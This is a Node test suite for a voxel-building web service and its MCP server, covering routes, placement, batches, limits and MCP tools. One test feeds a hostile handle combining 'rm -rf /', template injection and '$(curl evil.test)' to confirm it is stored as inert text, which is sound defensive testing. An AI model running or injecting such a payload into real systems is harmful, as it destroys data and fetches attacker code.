import test from "node:test";
import assert from "node:assert/strict";
import worker, { TYPES, WORLD, dayKey } from "../src/worker.js";

const origin = "https://worldorder.club";

// Minimal in-memory Workers KV stand-in: get/put/delete/list with prefix+cursor.
function makeKV() {
  const store = new Map();
  return {
    store,
    async get(key) {
      const hit = store.get(key);
      if (!hit) return null;
      if (hit.expires && hit.expires < Date.now()) { store.delete(key); return null; }
      return hit.value;
    },
    async put(key, value, opts = {}) {
      store.set(key, { value: String(value), expires: opts.expirationTtl ? Date.now() + opts.expirationTtl * 1000 : 0 });
    },
    async delete(key) { store.delete(key); },
    async list({ prefix = "", limit = 1000, cursor } = {}) {
      const all = [...store.keys()].filter((k) => k.startsWith(prefix)).sort();
      const start = cursor ? Number(cursor) : 0;
      const slice = all.slice(start, start + limit);
      const next = start + limit;
      return { keys: slice.map((name) => ({ name })), list_complete: next >= all.length, cursor: String(next) };
    }
  };
}

async function call(path, init = {}, kv = makeKV()) {
  const pending = [];
  const ctx = { waitUntil: (p) => pending.push(Promise.resolve(p)) };
  const response = await worker.fetch(new Request(`${origin}${path}`, init), { METRICS: kv }, ctx);
  await Promise.allSettled(pending);
  return { response, kv, ctx };
}

async function bodyOf(path, init, kv) {
  const { response, kv: usedKv } = await call(path, init, kv);
  const text = await response.text();
  let jsonBody = null;
  try { jsonBody = JSON.parse(text); } catch { /* html */ }
  return { response, text, json: jsonBody, kv: usedKv };
}

const post = (obj) => ({ method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(obj) });

test("static surfaces are discoverable", async () => {
  for (const [path, contentType] of [
    ["/", "text/html"],
    ["/install", "text/html"],
    ["/log", "text/html"],
    ["/social-card.svg", "image/svg\\+xml"],
    ["/llms.txt", "text/plain"],
    ["/llms-full.txt", "text/plain"],
    ["/mcp.json", "application/json"],
    ["/server.json", "application/json"],
    ["/.well-known/ard.json", "application/json"],
    ["/openapi.json", "application/json"],
    ["/capabilities.json", "application/json"],
    ["/robots.txt", "text/plain"],
    ["/sitemap.xml", "application/xml"],
    ["/api/v1", "application/json"],
    ["/api/v1/invitation", "application/json"],
    ["/api/v1/templates", "application/json"],
    ["/api/v1/status", "application/json"],
    ["/api/v1/stats", "application/json"],
    ["/api/v1/overview", "application/json"]
    ,["/api/v1/changes", "application/json"]
  ]) {
    const { response } = await call(path);
    assert.equal(response.status, 200, path);
    assert.match(response.headers.get("content-type"), new RegExp(contentType), path);
  }
});

test("ARD advertises the live MCP server for semantic discovery", async () => {
  const { response: homeResponse, text: home } = await bodyOf("/");
  const { json: manifest } = await bodyOf("/.well-known/ard.json");
  const { json: card } = await bodyOf("/server.json");
  const [entry] = manifest.entries;
  assert.match(homeResponse.headers.get("link"), /rel="ard"/);
  assert.match(home, /rel="ard"/);
  assert.equal(entry.identifier, "urn:air:worldorder.club:mcp:cube-playground");
  assert.equal(entry.type, "application/mcp-server-card+json");
  assert.equal(entry.url, "https://worldorder.club/server.json");
  assert.ok(entry.representativeQueries.length >= 2 && entry.representativeQueries.length <= 5);
  assert.equal(card.remotes[0].url, "https://worldorder.club/mcp");
});

test("privacy disclosure distinguishes telemetry from public world history", async () => {
  const { json: status } = await bodyOf("/api/v1/status");
  assert.match(status.privacy, /raw IP addresses are never stored/);
  assert.match(status.privacy, /bounded 256-event activity feed/);
  assert.match(status.privacy, /coordinates, block choices, and builder handles/);

  const { text: guide } = await bodyOf("/llms-full.txt");
  assert.match(guide, /World data is intentionally public and separate from telemetry/);
  assert.match(guide, /up to 256 successful mutations/);
});

test("open invitation is concrete and transparently system-authored", async () => {
  const kv = makeKV();
  const { json } = await bodyOf("/api/v1/invitation", {}, kv);
  assert.equal(json.id, "first-light");
  assert.equal(json.authored_by, "WOCLUB system");
  assert.deepEqual(json.focus, { x: 500, y: 0, z: 500 });
  assert.match(json.note, /not guest activity/i);
  assert.match(json.read_url, /x=492/);
  assert.equal(json.http.method, "POST");
  assert.equal(json.http.url, "https://worldorder.club/api/v1/batch");
  assert.deepEqual(json.mcp, { tool: "build", arguments: json.http.body });
  assert.equal(json.http.body.ops.length, 7);
  for (const op of json.http.body.ops) {
    assert.ok(Number.isInteger(op.x) && op.x >= 0 && op.x < 1000);
    assert.ok(Number.isInteger(op.y) && op.y >= 0 && op.y < 1000);
    assert.ok(Number.isInteger(op.z) && op.z >= 0 && op.z < 1000);
    assert.equal(op.builder, "your-handle");
    const insideSeedRegion = op.x >= 492 && op.x < 509 && op.y >= 0 && op.y < 16 && op.z >= 492 && op.z < 509;
    assert.equal(insideSeedRegion, false, `extension overlaps seeded First Light bounds at ${op.x},${op.y},${op.z}`);
  }
  const built = await bodyOf("/api/v1/batch", post(json.http.body), kv);
  assert.equal(built.response.status, 200);
  assert.deepEqual(built.json.summary, { placed: 7, removed: 0, replaced: 0, rejected: 0 });
});

test("structure templates are valid ready-to-post batch bodies", async () => {
  const kv = makeKV();
  const { json } = await bodyOf("/api/v1/templates", {}, kv);
  assert.deepEqual(json.templates.map((item) => item.id), ["pillar", "arch", "staircase", "room-5x5", "letter-w"]);
  for (const template of json.templates) {
    assert.ok(template.body.ops.length > 0 && template.body.ops.length <= 512, template.id);
    const built = await bodyOf("/api/v1/batch", post(template.body), kv);
    assert.equal(built.response.status, 200, template.id);
    assert.equal(built.json.summary.rejected, 0, template.id);
  }
});

test("homepage and guide describe the cube playground, not the gym", async () => {
  const { text: home } = await bodyOf("/");
  assert.match(home, /Cube Playground/);
  assert.match(home, /\/api\/v1\/place/);
  assert.match(home, /property="og:image" content="https:\/\/worldorder\.club\/social-card\.png"/);
  assert.match(home, /name="twitter:image" content="https:\/\/worldorder\.club\/social-card\.png"/);
  assert.doesNotMatch(home, /Protocol Gym/);
  assert.doesNotMatch(home, /challenge\/today/);
  const { text: llms } = await bodyOf("/llms.txt");
  assert.match(llms, /voxel world/i);
  assert.match(llms, /y=0 is ground/);
  assert.match(llms, /First Light/);
});

test("VS Code install handoff is one command through the remote MCP endpoint", async () => {
  const { text: install } = await bodyOf("/install");
  assert.match(install, /code --add-mcp/);
  assert.match(install, /&quot;name&quot;:&quot;woclub&quot;/);
  assert.match(install, /https:\/\/worldorder\.club\/mcp/);
  assert.match(install, /build_something/);
  assert.match(install, /\.vscode\/mcp\.json/);
  const { text: home } = await bodyOf("/");
  const { text: guide } = await bodyOf("/llms.txt");
  assert.match(home, /href="\/install"/);
  assert.match(guide, /https:\/\/worldorder\.club\/install/);
});

test("/log is Russian, two-column, and has no untranslated headings", async () => {
  const { text } = await bodyOf("/log");
  assert.match(text, /<html lang="ru">/);
  assert.match(text, /grid-template-columns:1fr 1fr/);
  assert.equal((text.match(/class="col"/g) || []).length, 2);
  for (const [, contents] of text.matchAll(/<h3>(.*?)<\/h3>/g)) {
    const visible = contents.replace(/<[^>]+>/g, "");
    if (/[A-Za-z]{4}/.test(visible)) assert.match(visible, /[А-Яа-яЁё]/, `untranslated: ${visible}`);
  }
});

test("empty world stats and overview have the right shape", async () => {
  const { json: stats } = await bodyOf("/api/v1/stats");
  assert.equal(stats.cubes, 0);
  assert.equal(stats.world.size, WORLD);
  assert.equal(stats.world.ground_y, 0);
  assert.deepEqual(stats.blocks, TYPES);

  const { json: overview } = await bodyOf("/api/v1/overview");
  assert.equal(overview.resolution * overview.resolution, overview.grid.length);
  assert.equal(overview.cubes, 0);
  assert.ok(overview.grid.every((cell) => Array.isArray(cell) && cell.length === 2));

  const { json: sparse } = await bodyOf("/api/v1/overview?format=sparse");
  assert.equal(sparse.format, "sparse");
  assert.deepEqual(sparse.cells, []);
  assert.equal(sparse.grid, undefined);
  for (const key of ["resolution", "unit", "types", "cubes", "chunks_scanned", "truncated", "cached"])
    assert.deepEqual(sparse[key], overview[key]);
});

test("sparse and dense overview formats describe the same occupied cells", async () => {
  const kv = makeKV();
  await bodyOf("/api/v1/batch", post({ ops: [
    { op: "place", x: 10, y: 2, z: 15, type: "stone" },
    { op: "place", x: 11, y: 7, z: 16, type: "gold" },
    { op: "place", x: 900, y: 3, z: 800, type: "glass" }
  ] }), kv);
  const dense = (await bodyOf("/api/v1/overview", {}, kv)).json;
  const sparse = (await bodyOf("/api/v1/overview?format=sparse", {}, kv)).json;
  const occupied = dense.grid.flatMap((cell, index) => cell[0] < 0 ? [] : [[index, cell[0], cell[1]]]);
  assert.deepEqual(sparse.cells, occupied);
  assert.equal(sparse.cubes, dense.cubes);
  assert.equal(sparse.cells.length, 2);
});

test("place then read the cube, the region, and the stats", async () => {
  const kv = makeKV();
  const placed = await bodyOf("/api/v1/place", post({ x: 500, y: 0, z: 500, type: "stone", builder: "alice" }), kv);
  assert.equal(placed.response.status, 200);
  assert.equal(placed.json.ok, true);
  assert.equal(placed.json.result.replaced, false);

  const cube = await bodyOf("/api/v1/cube?x=500&y=0&z=500", {}, kv);
  assert.equal(cube.json.cube.type, "stone");
  assert.equal(cube.json.cube.builder, "alice");

  const region = await bodyOf("/api/v1/region?x=480&z=480&w=64&d=64", {}, kv);
  assert.equal(region.json.count, 1);
  assert.equal(region.json.cubes[0].x, 500);
  assert.equal(region.json.box.h, WORLD); // omitted h spans the full height

  kv.store.delete("w:ov");
  const stats = await bodyOf("/api/v1/stats", {}, kv);
  assert.equal(stats.json.cubes, 1);
  assert.equal(stats.json.per_type.stone, 1);
  assert.equal(stats.json.top_builders[0].builder, "alice");
});

test("placing on an occupied cell replaces it", async () => {
  const kv = makeKV();
  await bodyOf("/api/v1/place", post({ x: 1, y: 1, z: 1, type: "stone" }), kv);
  const again = await bodyOf("/api/v1/place", post({ x: 1, y: 1, z: 1, type: "gold" }), kv);
  assert.equal(again.json.result.replaced, true);
  const cube = await bodyOf("/api/v1/cube?x=1&y=1&z=1", {}, kv);
  assert.equal(cube.json.cube.type, "gold");
});

test("changes feed records mutations and resumes from an opaque cursor", async () => {
  const kv = makeKV();
  await bodyOf("/api/v1/batch", post({ ops: [
    { op: "place", x: 30, y: 0, z: 30, type: "wood", builder: "observer" },
    { op: "place", x: 30, y: 1, z: 30, type: "leaves", builder: "observer" }
  ] }), kv);
  const first = await bodyOf("/api/v1/changes?limit=1", {}, kv);
  assert.equal(first.json.events.length, 1);
  assert.equal(first.json.events[0].builder, "observer");
  assert.equal(first.json.events[0].y, 1, "without since the feed returns the latest events");
  assert.equal(first.json.has_more, false);
  const cursor = first.json.next_cursor;
  assert.match(cursor, /^[a-z0-9]+-[a-z0-9]+$/);

  await bodyOf("/api/v1/remove", post({ x: 30, y: 1, z: 30 }), kv);
  await bodyOf("/api/v1/remove", post({ x: 999, y: 999, z: 999 }), kv);
  const after = await bodyOf(`/api/v1/changes?since=${encodeURIComponent(cursor)}`, {}, kv);
  assert.equal(after.json.events.length, 1, "a no-op removal is not a world change");
  assert.equal(after.json.events[0].op, "remove");
  assert.equal(after.json.events[0].type, "leaves");
});

test("out-of-bounds and unknown-type placements are rejected", async () => {
  for (const bad of [
    { x: -1, y: 0, z: 0, type: "stone" },
    { x: WORLD, y: 0, z: 0, type: "stone" },
    { x: 1.5, y: 0, z: 0, type: "stone" },
    { x: 0, y: 0, z: 0, type: "unobtainium" }
  ]) {
    const { response, json } = await bodyOf("/api/v1/place", post(bad));
    assert.equal(response.status, 400, JSON.stringify(bad));
    assert.ok(["out_of_bounds", "unknown_type", "invalid_request"].includes(json.error));
  }
});

test("batch applies a chain in order and reports each op", async () => {
  const kv = makeKV();
  const { json } = await bodyOf("/api/v1/batch", post({
    ops: [
      { op: "place", x: 10, y: 0, z: 10, type: "wood", builder: "bob" },
      { op: "place", x: 10, y: 1, z: 10, type: "wood", builder: "bob" },
      { op: "place", x: 10, y: 2, z: 10, type: "leaves", builder: "bob" },
      { op: "place", x: 10, y: 3, z: 10, type: "notarealtype" },
      { op: "remove", x: 10, y: 0, z: 10 }
    ]
  }), kv);
  assert.equal(json.summary.placed, 3);
  assert.equal(json.summary.removed, 1);
  assert.equal(json.summary.rejected, 1);
  assert.equal(json.results[3].ok, false);
  assert.equal(json.results[3].error, "unknown_type");
  assert.equal(json.results[4].removed, true);

  kv.store.delete("w:ov");
  const stats = await bodyOf("/api/v1/stats", {}, kv);
  assert.equal(stats.json.cubes, 2);
});

test("batch rejects an oversized op list", async () => {
  const ops = Array.from({ length: 513 }, (_, i) => ({ op: "place", x: i, y: 0, z: 0, type: "stone" }));
  const { response, json } = await bodyOf("/api/v1/batch", post({ ops }));
  assert.equal(response.status, 400);
  assert.equal(json.error, "invalid_batch");
});

test("fill covers a box and rejects a box that is too large", async () => {
  const kv = makeKV();
  const ok = await bodyOf("/api/v1/fill", post({ from: { x: 0, y: 0, z: 0 }, to: { x: 9, y: 0, z: 9 }, type: "sand", builder: "carol" }), kv);
  assert.equal(ok.json.ok, true);
  assert.equal(ok.json.cells, 100);
  assert.equal(ok.json.summary.placed, 100);

  const tooBig = await bodyOf("/api/v1/fill", post({ from: { x: 0, y: 0, z: 0 }, to: { x: 50, y: 5, z: 50 }, type: "sand" }), kv);
  assert.equal(tooBig.response.status, 400);
  assert.equal(tooBig.json.error, "fill_too_large");
});

test("remove reports whether a cell was occupied", async () => {
  const kv = makeKV();
  await bodyOf("/api/v1/place", post({ x: 7, y: 7, z: 7, type: "metal" }), kv);
  const hit = await bodyOf("/api/v1/remove", post({ x: 7, y: 7, z: 7 }), kv);
  assert.equal(hit.json.result.removed, true);
  const miss = await bodyOf("/api/v1/remove", post({ x: 7, y: 7, z: 7 }), kv);
  assert.equal(miss.json.result.removed, false);
});

test("clear removes only the given builder's cubes", async () => {
  const kv = makeKV();
  await bodyOf("/api/v1/batch", post({ ops: [
    { op: "place", x: 1, y: 0, z: 1, type: "stone", builder: "dave" },
    { op: "place", x: 2, y: 0, z: 2, type: "stone", builder: "dave" },
    { op: "place", x: 3, y: 0, z: 3, type: "stone", builder: "erin" }
  ] }), kv);
  const cleared = await bodyOf("/api/v1/clear", post({ builder: "dave" }), kv);
  assert.equal(cleared.json.removed, 2);
  kv.store.delete("w:ov");
  const stats = await bodyOf("/api/v1/stats", {}, kv);
  assert.equal(stats.json.cubes, 1);
  assert.equal(stats.json.top_builders[0].builder, "erin");
});

test("request bodies are size-capped", async () => {
  const huge = "x".repeat(9000);
  const single = await bodyOf("/api/v1/place", post({ x: 0, y: 0, z: 0, type: "stone", builder: huge }));
  assert.equal(single.response.status, 413);

  const bulk = "y".repeat(300000);
  const batch = await bodyOf("/api/v1/batch", post({ ops: [{ op: "place", x: 0, y: 0, z: 0, type: "stone", note: bulk }] }));
  assert.equal(batch.response.status, 413);
});

test("region rejects a request that spans too many chunks", async () => {
  const { response, json } = await bodyOf("/api/v1/region?x=0&z=0&w=1000&d=1000");
  assert.equal(response.status, 400);
  assert.equal(json.error, "region_too_large");
});

test("submitted text is stored as inert data, never acted on", async () => {
  const kv = makeKV();
  const hostile = '"; rm -rf / #  {{7*7}}  $(curl evil.test)';
  const { json } = await bodyOf("/api/v1/place", post({ x: 400, y: 0, z: 400, type: "obsidian", builder: hostile }), kv);
  assert.equal(json.ok, true);
  const cube = await bodyOf("/api/v1/cube?x=400&y=0&z=400", {}, kv);
  // stored verbatim (trimmed to the handle length cap), returned as a plain string
  assert.equal(typeof cube.json.cube.builder, "string");
  assert.ok(cube.json.cube.builder.startsWith('"; rm -rf'));
  assert.ok(cube.json.cube.builder.length <= 40);
});

test("OPTIONS and unknown routes behave", async () => {
  const options = await call("/api/v1/place", { method: "OPTIONS" });
  assert.equal(options.response.status, 204);
  const missing = await bodyOf("/api/v1/nope");
  assert.equal(missing.response.status, 404);
  assert.equal(missing.json.error, "not_found");
});

// --- MCP ---------------------------------------------------------------------

const rpc = (method, params, id = 1) => post({ jsonrpc: "2.0", id, method, params });

test("MCP initialize and tools/list expose the build tools", async () => {
  const init = await bodyOf("/mcp", rpc("initialize", { protocolVersion: "2025-06-18" }), makeKV());
  assert.equal(init.json.result.serverInfo.name, "woclub-cube-playground");

  const list = await bodyOf("/mcp", rpc("tools/list", {}), makeKV());
  const names = list.json.result.tools.map((t) => t.name).sort();
  assert.deepEqual(names, [
    "build", "clear_mine", "fill_box", "get_cube", "get_overview",
    "get_region", "get_world_stats", "place_cube", "remove_cube"
  ]);
});

test("MCP 2026-07-28 discovery enables stateless modern clients", async () => {
  const modernRpc = (method, params = {}, id = 1) => ({
    method: "POST",
    headers: { "content-type": "application/json", "mcp-protocol-version": "2026-07-28" },
    body: JSON.stringify({
      jsonrpc: "2.0", id, method,
      params: {
        ...params,
        _meta: {
          "io.modelcontextprotocol/protocolVersion": "2026-07-28",
          "io.modelcontextprotocol/clientInfo": { name: "woclub-test", version: "1.0.0" },
          "io.modelcontextprotocol/clientCapabilities": {}
        }
      }
    })
  });
  const discovered = await bodyOf("/mcp", modernRpc("server/discover"), makeKV());
  assert.deepEqual(discovered.json.result.supportedVersions, ["2026-07-28", "2025-06-18", "2025-03-26"]);
  assert.equal(discovered.json.result.resultType, "complete");
  assert.equal(discovered.json.result.cacheScope, "public");
  assert.equal(discovered.json.result._meta["io.modelcontextprotocol/serverInfo"].name, "woclub-cube-playground");

  const list = await bodyOf("/mcp", modernRpc("tools/list"), makeKV());
  assert.equal(list.json.result.resultType, "complete");
  assert.equal(list.json.result.tools.length, 9);
  assert.equal(list.json.result._meta["io.modelcontextprotocol/serverInfo"].version, "2.6.0");
});

test("MCP place_cube then get_region round-trips through one KV", async () => {
  const kv = makeKV();
  const placed = await bodyOf("/mcp", rpc("tools/call", { name: "place_cube", arguments: { x: 100, y: 0, z: 100, type: "grass", builder: "mcp-agent" } }), kv);
  assert.equal(placed.json.result.structuredContent.ok, true);

  const region = await bodyOf("/mcp", rpc("tools/call", { name: "get_region", arguments: { x: 96, z: 96, w: 16, d: 16 } }), kv);
  assert.equal(region.json.result.structuredContent.count, 1);
  assert.equal(region.json.result.structuredContent.cubes[0].type, "grass");
});

test("MCP build applies a chain and reports a summary", async () => {
  const kv = makeKV();
  const built = await bodyOf("/mcp", rpc("tools/call", { name: "build", arguments: { ops: [
    { op: "place", x: 200, y: 0, z: 200, type: "brick" },
    { op: "place", x: 200, y: 1, z: 200, type: "brick" },
    { op: "place", x: 200, y: 2, z: 200, type: "glass" }
  ] } }), kv);
  assert.equal(built.json.result.structuredContent.summary.placed, 3);

  // a region read with no y/h must see the whole vertical stack, not just y=0
  const region = await bodyOf("/mcp", rpc("tools/call", { name: "get_region", arguments: { x: 192, z: 192, w: 16, d: 16 } }), kv);
  assert.equal(region.json.result.structuredContent.count, 3);
});

test("MCP prompt build_something is argument-free and project-authored", async () => {
  const list = await bodyOf("/mcp", rpc("prompts/list", {}), makeKV());
  assert.equal(list.json.result.prompts[0].name, "build_something");
  const got = await bodyOf("/mcp", rpc("prompts/get", { name: "build_something" }), makeKV());
  assert.match(got.json.result.messages[0].content.text, /your-handle/);
  assert.match(got.json.result.messages[0].content.text, /"x": 510/);
  assert.match(got.json.result.messages[0].content.text, /get_region/);
  assert.match(got.json.result.messages[0].content.text, /inert data/);
});

test("MCP resource woclub://overview returns the raster", async () => {
  const res = await bodyOf("/mcp", rpc("resources/read", { uri: "woclub://overview" }), makeKV());
  const parsed = JSON.parse(res.json.result.contents[0].text);
  assert.equal(parsed.format, "sparse");
  assert.ok(Array.isArray(parsed.cells));
  assert.equal(parsed.grid, undefined);
});

test("dayKey is a UTC date string", () => {
  assert.match(dayKey(new Date("2026-09-06T23:00:00Z")), /^2026-09-06$/);
});
